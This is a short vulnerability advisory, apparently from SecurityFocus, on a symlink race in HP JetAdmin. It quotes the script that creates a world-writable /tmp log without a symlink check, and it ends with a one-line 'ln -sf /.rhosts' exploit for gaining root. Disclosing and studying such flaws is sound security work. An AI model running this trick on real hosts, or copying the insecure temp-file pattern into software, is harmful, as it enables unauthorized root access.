source: http://www.securityfocus.com/bid/157/info
 
A vulnerability exists in HP's JetAdmin Rev. D.01.09 software. Due to its failure to check if it is following a symbolic link, it is possible for an attacker to create a link from /tmp/jetadmin.log to anywhere on the filesystem, with permissions for reading and writing by everyone on the system. This can be used to gain root access.
 
The problem lies in the checking and creation of the log file. The following snippit is from /opt/hpnp/admin/jetadmin.
----
LOG=$TMP/jetadmin.log
 
if [ ! -f "$LOG" ]
then
touch $LOG
chmod 666 $LOG
fi
----
 
If the log file does not exist, the jetadmin script will create it, and change its permissions to 666. It does not check if the file is a symbolic link.
 
ln -sf /.rhosts /tmp/jetadmin.log